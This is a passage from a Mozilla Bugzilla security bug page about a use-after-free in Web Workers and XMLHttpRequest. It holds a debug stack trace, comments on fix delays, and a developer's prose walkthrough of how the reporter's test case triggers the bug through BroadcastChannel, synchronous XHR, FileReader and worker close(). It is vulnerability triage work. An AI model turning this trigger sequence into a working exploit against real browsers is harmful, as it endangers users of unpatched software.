#19: mozilla::EventTargetChainItem::HandleEvent(mozilla::EventChainPostVisitor&amp;, mozilla::ELMCreationDetector&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x9569b38]
#20: mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray&lt;mozilla::EventTargetChainItem&gt;&amp;, mozilla::EventChainPostVisitor&amp;, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x9567316]
#21: mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray&lt;mozilla::dom::EventTarget*&gt;*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x956f585]
#22: mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsPresContext*, nsEventStatus*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x957a2ba]
#23: mozilla::DOMEventTargetHelper::DispatchEvent(mozilla::dom::Event&amp;, mozilla::dom::CallerType, mozilla::ErrorResult&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x9512c9d]
#24: mozilla::dom::EventTarget::DispatchEvent(mozilla::dom::Event&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x95a3902]
#25: mozilla::dom::BroadcastChannelChild::RecvNotify(mozilla::dom::ClonedMessageData const&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb8c6ba1]
#26: mozilla::dom::PBroadcastChannelChild::OnMessageReceived(IPC::Message const&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x291d860]
#27: mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x22bbf38]
#28: mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1ab6370]
#29: mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&amp;&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1aaf72f]
#30: mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1ab22e7]
#31: mozilla::ipc::MessageChannel::MessageTask::Run()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1ab3898]
#32: nsThread::ProcessNextEvent(bool, bool*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x41e3a0]
#33: NS_ProcessPendingEvents(nsIThread*, unsigned int)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x4158a6]
#34: mozilla::dom::WorkerPrivate::ClearMainEventQueue(mozilla::dom::WorkerPrivate::WorkerRanOrNot)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb80a7d2]
#35: mozilla::dom::WorkerPrivate::DestroySyncLoop(unsigned int)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb811fa8]
#36: mozilla::dom::WorkerPrivate::RunCurrentSyncLoop()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb8114d1]
#37: mozilla::dom::(anonymous namespace)::LoadAllScripts(mozilla::dom::WorkerPrivate*, nsTArray&lt;mozilla::dom::(anonymous namespace)::ScriptLoadInfo&gt;&amp;, bool, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb771aaa]
#38: mozilla::dom::workerinternals::LoadMainScript(mozilla::dom::WorkerPrivate*, nsTSubstring&lt;char16_t&gt; const&amp;, mozilla::dom::WorkerScriptType, mozilla::ErrorResult&amp;)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb77093a]
#39: mozilla::dom::(anonymous namespace)::CompileScriptRunnable::WorkerRun(JSContext*, mozilla::dom::WorkerPrivate*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb859995]
#40: mozilla::dom::WorkerRunnable::Run()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb833e05]
#41: nsThread::ProcessNextEvent(bool, bool*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x41e3a0]
#42: NS_ProcessNextEvent(nsIThread*, bool)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x42b324]
#43: mozilla::dom::WorkerPrivate::DoRunLoop(JSContext*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb7ff9d5]
#44: mozilla::dom::workerinternals::(anonymous namespace)::WorkerThreadPrimaryRunnable::Run()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0xb79e846]
#45: nsThread::ProcessNextEvent(bool, bool*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x41e3a0]
#46: NS_ProcessNextEvent(nsIThread*, bool)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x42b324]
#47: mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1ac489e]
#48: MessageLoop::RunInternal()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x1972961]
#49: MessageLoop::Run()[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x197259e]
#50: nsThread::ThreadFunc(void*)[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/XUL +0x413d86]
#51: _pt_root[/Users/yarontausky/src/gecko/obj/dist/NightlyDebug.app/Contents/MacOS/libnss3.dylib +0x423007]
#52: _pthread_body[/usr/lib/system/libsystem_pthread.dylib +0x32eb]
#53: _pthread_start[/usr/lib/system/libsystem_pthread.dylib +0x6249]
</code></pre>
</div><div class="activity"><div class="change">Status: NEW &rarr; ASSIGNED</div><div class="change">Priority: -- &rarr; P2</div></div></div><div class="change-set" id="c4"><div class="comment" data-id="14165991" data-no="4"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-4" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_506912" id="a1252758_621888"><img src="https://secure.gravatar.com/avatar/387b65e77a270f67cd03547039f6b2eb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_506912" id="a1252758_621888"><a class="email " href="/user_profile?user_id=506912" > <span class="fna">Looben Yang</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-4"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-4" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c4">Comment 4</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-06-06 15:14 PDT" data-time="1559859246">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-4">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-4" data-comment-id="14165991" data-ismarkdown="true" ><p>Is there anyone working on this bug? It&#39;s reported almost 2 months ago.</p>
</div></div><div class="change-set" id="c5"><div class="comment" data-id="14166124" data-no="5"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-5" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a1252758_621888"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a1252758_621888"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-5"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-5" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c5">Comment 5</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-06-06 16:42 PDT" data-time="1559864558">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-5">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-5" data-comment-id="14166124" data-ismarkdown="true" ><p>Thanks for checking.  It is indeed being worked, but we&#39;re trying hard to avoid just pushing the signatures around.  There are some systemic issues around worker shutdown that we&#39;re looking into.</p>
<p>That said, I don&#39;t think I&#39;d fully processed <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1545345#c2" title="RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest">comment 2</a> indicating control over the instruction pointer.  Can you clarify what build you reproduced that on?  We may need to land a combination of changes that shunt this scenario to crashes or early failures.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(loobenyang)</div></div></div><div class="change-set" id="c6"><div class="comment" data-id="14166141" data-no="6"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-6" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_506912" id="a1252758_621888"><img src="https://secure.gravatar.com/avatar/387b65e77a270f67cd03547039f6b2eb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_506912" id="a1252758_621888"><a class="email " href="/user_profile?user_id=506912" > <span class="fna">Looben Yang</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-6"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-6" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c6">Comment 6</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-06-06 16:49 PDT" data-time="1559864972">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-6">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-6" data-comment-id="14166141" data-ismarkdown="true" ><p>(In reply to Andrew Sutherland [:asuth] (he/him) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1545345#c5" title="RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest">comment #5</a>)</p>
<blockquote>
<p>Thanks for checking.  It is indeed being worked, but we&#39;re trying hard to avoid just pushing the signatures around.  There are some systemic issues around worker shutdown that we&#39;re looking into.</p>
<p>That said, I don&#39;t think I&#39;d fully processed <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1545345#c2" title="RESOLVED FIXED - Web Workers - Use After Free with XMLHttpRequest">comment 2</a> indicating control over the instruction pointer.  Can you clarify what build you reproduced that on?  We may need to land a combination of changes that shunt this scenario to crashes or early failures.</p>
</blockquote>
<p>That&#39;s run against an official 32 bit Firefox nightly build from Mozilla, a latest nightly build on that day.</p>
<p>Firefox version: 68.0a1 (2019-04-17) (32-bit)</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(loobenyang)</span></div></div></div><div class="change-set" id="c7"><div class="comment" data-id="14189904" data-no="7"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-7" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a1252758_621888"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_580382" id="a1252758_621888"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-7"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-7" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c7">Comment 7</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-06-20 11:25 PDT" data-time="1561055151">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-7">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-7" data-comment-id="14189904" data-ismarkdown="true" ><p>Any updates?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(bugmail)</div></div></div><div class="change-set" id="a5597328_434964"><div class="change" id="aa5597328_434964">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_434964" id="a5597328_434964"><img src="https://secure.gravatar.com/avatar/331afc283e18d6d28cb7ebb11b2cf5bb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_434964" id="a5597328_434964"><a class="email " href="/user_profile?user_id=434964" > <span class="fna">Hsin-Yi Tsai [:hsinyi]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a5597328_434964"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a5597328_434964">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#a5597328_434964">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-06-21 16:33 PDT" data-time="1561160003">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Assignee: ytausky &rarr; bugmail</div></div></div><div class="change-set" id="c8"><div class="comment" data-id="14211968" data-no="8"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-8" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_506912" id="a5597328_434964"><img src="https://secure.gravatar.com/avatar/387b65e77a270f67cd03547039f6b2eb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_506912" id="a5597328_434964"><a class="email " href="/user_profile?user_id=506912" > <span class="fna">Looben Yang</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-8"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-8" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c8">Comment 8</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-02 16:04 PDT" data-time="1562108696">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-8">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-8" data-comment-id="14211968" data-ismarkdown="true" ><p>Is there any update? It&#39;s almost 3 months.<br>
Usually security bugs were fixed in a couple weeks. If some developers were overloaded, can this be assigned to someone else?</p>
</div></div><div class="change-set" id="c9"><div class="comment" data-id="14212904" data-no="9"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-9" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_580382" id="a5597328_434964"><img src="https://secure.gravatar.com/avatar/15b9b3783e4671cd882bff1316df14c9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_580382" id="a5597328_434964"><a class="email " href="/user_profile?user_id=580382" > <span class="fna">Julien Cristau [:jcristau]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-9"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-9" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c9">Comment 9</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-03 07:06 PDT" data-time="1562162781">2 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1545345&amp;comment_id=14212904"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-9">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-9" data-comment-id="14212904" data-ismarkdown="true" ><p>Tracking Requested - why for this release: sec-high.</p>
<p>It&#39;s too late for 68 at this point.</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=isnotempty">status-firefox68</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=isnotempty">status-firefox69</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=isnotempty">status-firefox-esr68</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox69&amp;o1=isnotempty">tracking-firefox69</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox69&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr68&amp;o1=isnotempty">tracking-firefox-esr68</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr68&amp;o1=equals&amp;v1=%3F">?</a></div></div></div><div class="change-set" id="c10"><div class="comment" data-id="14220957" data-no="10"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-10" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a5597328_434964"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a5597328_434964"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-10"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-10" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c10">Comment 10</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-08 09:22 PDT" data-time="1562602943">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-10">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-10" data-comment-id="14220957" data-ismarkdown="true" ><p>We have a stack of patches in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1559919" title="RESOLVED FIXED - Finish the WorkerHolder cleanup">bug 1559919</a> that we believe should improve worker invariants in general.  We&#39;ll be trying to land these this week and mop up the rest of the related worker life-cycle invariants as well that aren&#39;t fixed.  The particular concern for this bug is that IPC messages continued to be processed and run content-exposed code after they should (plus some extra complexities involving the sync loop).</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bugmail)</span></div></div></div><div class="change-set" id="c11"><div class="comment" data-id="14252626" data-no="11"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-11" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a5597328_434964"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_75935" id="a5597328_434964"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-11"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-11" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c11">Comment 11</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-07-22 14:01 PDT" data-time="1563829274">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-11">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-11" data-comment-id="14252626" data-ismarkdown="true" ><p>I&#39;m going to assume that <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1559919" title="RESOLVED FIXED - Finish the WorkerHolder cleanup">bug 1559919</a> isn&#39;t something we can uplift, so where does that leave us for Fx69/ESR68 for this bug? Is there anything we can do at least make this a safe crash there or something?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(bugmail)</div></div></div><div class="change-set" id="c12"><div class="comment" data-id="14275204" data-no="12"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-12" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_506912" id="a5597328_434964"><img src="https://secure.gravatar.com/avatar/387b65e77a270f67cd03547039f6b2eb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_506912" id="a5597328_434964"><a class="email " href="/user_profile?user_id=506912" > <span class="fna">Looben Yang</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-12"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-12" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c12">Comment 12</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-01 15:57 PDT" data-time="1564700270">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-12">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-12" data-comment-id="14275204" data-ismarkdown="true" ><p>This bug missed the 90 day deadline advocated by Google. It never happens before with Mozilla.</p>
</div></div><div class="change-set" id="c13"><div class="comment" data-id="14287403" data-no="13"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-13" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_151407" id="a5597328_434964"><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_151407" id="a5597328_434964"><a class="email " href="/user_profile?user_id=151407" > <span class="fna">Andrew Sutherland [:asuth] (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-13"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-13" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1545345#c13">Comment 13</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-08-07 23:15 PDT" data-time="1565244939">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-13">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-13" data-comment-id="14287403" data-ismarkdown="true" ><p>Massive apologies on the delays on this bug.</p>
<p><a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1559919" title="RESOLVED FIXED - Finish the WorkerHolder cleanup">Bug 1559919</a> did not address the invariant issues.  So here&#39;s the current analysis and plans for imminent fixes:</p>
<h2>What the Test Case Is Doing</h2>
<ul>
<li>Page:
<ul>
<li>Creates a worker.</li>
<li>Spams the worker using BroadcastChannel.  The (emergent) intent of this is<br>
to trigger a synchronous XHR from inside<br>
DestroySyncLoop/ClearMainEventQueue, creating a nested clearing/syncloop<br>
destruction.</li>
<li>Triggers a page reload.
<ul>
<li>This results in an attempt to terminate the worker, although it&#39;s not<br>
clear that this is necessary for the reproduction.</li>
<li>This also just reloads the whole scenario, helping to increase the<br>
likelihood of a nested syncloop occurring thanks to broadcast channel.</li>
</ul>
</li>
</ul>
</li>
<li>Worker:
<ul>
<li>Creates a BroadcastChannel listener whose (async) message handler initiates<br>
a synchronous XHR and then aborts it once it completes.
<ul>
<li>Both methods are WorkerThreadProxySyncRunnables which means they both<br>
create syncloops which means this widens the potenial for a nested<br>
syncloop to be created by the BroadcastChannel message.</li>
<li>These both end up needing to bounce to the main thread because that&#39;s<br>
where the canonical state lives.  (Even if the XHR object should<br>
notionally not need to consult the main thread, it does unless the worker<br>
has reached cancellation state.)</li>
</ul>
</li>
<li>Creates a file reader that configures the XHR for synchronous operation when<br>
the load completes (or aborts, as is the case in this situation.)</li>
<li>Creates the XHR (before close).</li>
<li>Calls self.close() which, because this is a top-level script load which<br>
means we&#39;re in a sync loop, causes a deferred invocation of<br>
ClearMainEventQueue and defers dispatching the cancel runnable.  From a<br>
spec perspective, it should be impossible to ever dispatch another task to<br>
the worker after this point.
<ul>
<li>We previously had a safer behavior where we would fail to do a lot of<br>
things after this point that would be observable by other globals despite<br>
this global&#39;s inability to receive and process further tasks.  We<br>
corrected this, allowing BroadcastChannel messages to be set, etc., and<br>
somewhat weakening our guards against dubious things happening after<br>
close() is called.</li>
</ul>
</li>
<li>Calls FileReader.readAsArrayBuffer:
<ul>
<li>This is probably fine.  This code intends to be a no-op when the worker is<br>
shutting down (and indeed, with close called, per spec, the load can never<br>
complete), but because the weak worker ref is tied to canceling, the<br>
closing state has no effect.  But this is likely fine because the state<br>
per spec should advance to loading, and that is observable per the spec<br>
for abort() which will generate synchronous event dispatches.</li>
<li>This puts us in mReadyState of LOADING and triggers an async wait.</li>
</ul>
</li>
<li>Calls FileReader.abort:
<ul>
<li>Because of the above call to readAsArrayBuffer, this does not fast-bail.<br>
We trigger a synchronous dispatch of the &quot;loadend&quot; event which triggers<br>
the logic to configure the XHR to be synchronous.  It&#39;s not clear that<br>
the FileReader is entirely necessary to the reproduction, but this<br>
behavior does seem necessary per spec.  (And is harmless unless I&#39;m<br>
missing a nuance.)</li>
</ul>
</li>
<li>The script reaches the end of its evaluation, which will cause the syncloop<br>
to attempt to unwind.  Which means it will attempt to call<br>
ClearMainEventQueue.  Unfortunately, BroadcastChannel operates on an IPC<br>
threading model and so doesn&#39;t get its event canceled.  Instead its event<br>
